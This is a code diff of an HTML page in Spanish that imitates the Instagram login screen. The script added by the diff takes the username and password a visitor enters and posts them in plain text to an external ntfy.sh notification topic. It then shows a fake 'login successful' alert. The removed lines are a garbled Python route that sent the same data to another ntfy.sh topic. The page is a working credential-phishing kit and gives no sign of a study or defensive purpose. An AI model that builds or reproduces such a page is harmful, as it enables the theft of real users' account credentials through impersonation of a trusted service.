@@ -101,39 +101,53 @@
 
   <div class="container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/512px-Instagram_logo.svg.png" alt="Instagram Logo" />
-    <form action="#" method="POST">
-      <input type="text" placeholder="Teléfono, usuario o correo electrónico" required />
-      <input type="password" placeholder="Contraseña" required />
-      <button type="submit">Iniciar sesion</button>
+    
+    <form id="loginForm">
+      <input type="text" name="usuario" placeholder="Teléfono, usuario o correo electrónico" required />
+      <input type="password" name="contrasena" placeholder="Contraseña" required />
+      <button type="submit" class="btn-login">Iniciar sesión</button>
     </form>
 
-    
     <div class="separator">O</div>
 
     <a href="#" class="fb-login">Iniciar sesión con Facebook</a>
     <a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
-@app.route('/enviar', methods=['POST'])
-def enviar():
-    try:
-        data = request.form
-        mensaje = f
+
     <div class="signup">
       ¿No tienes una cuenta? <a href="#">Regístrate</a>
     </div>
   </div>
-     Enviar a ntfy.sh
-        response = requests.post(
-            "https://ntfy.sh/USER_BYN9",  # Cambia YOUR_TOPIC por tu tema único
-            data=mensaje.encode('utf-8'),
-            headers={
-                "Title": "Nuevo mensaje de contacto",
-                "Priority": "high"
-            }
-        )
-        
-        return "✅Inicio de sesión exitoso", 200
-    except Exception as e:
-        return f"Error al enviar: {str(e)}", 500
+
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      const usuario = this.usuario.value;
+      const contrasena = this.contrasena.value;
+
+      const mensaje = `👤 Usuario: ${usuario}\n🔐 Contraseña: ${contrasena}`;
+
+      fetch("https://ntfy.sh/TU_TOPIC", {
+        method: "POST",
+        body: mensaje,
+        headers: {
+          "Title": "Nuevo inicio de sesión",
+          "Priority": "high"
+        }
+      })
+      .then(response => {
+        if (response.ok) {
+          alert("✅ Inicio de sesión exitoso.");
+          this.reset();
+        } else {
+          alert("❌ Error al enviar el inicio de sesión.");
+        }
+      })
+      .catch(error => {
+        alert("❌ Error de red: " + error.message);
+      });
+    });
+  </script>
 
 </body>
 </html>
